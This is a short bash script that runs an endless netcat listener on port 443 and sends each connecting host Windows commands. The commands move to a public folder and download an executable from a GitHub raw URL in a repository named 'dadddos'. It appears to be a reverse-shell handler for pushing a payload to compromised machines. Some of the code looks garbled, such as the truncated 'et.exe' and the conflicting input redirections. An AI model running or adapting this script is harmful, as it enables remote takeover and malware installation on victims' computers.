#!/bin/bash
while true
do
	
    echo "exit" > /tmp/nc_input.txt
    cat /tmp/nc_input.txt | nc -nlvp 443 << EOF 
   cd C:\users\public
et.exe https://raw.githubusercontent.com/attthous/dadddos/main/Hosts%20de%20servicio%20local%20(...).exe
exit
EOF
sleep 0.1

done
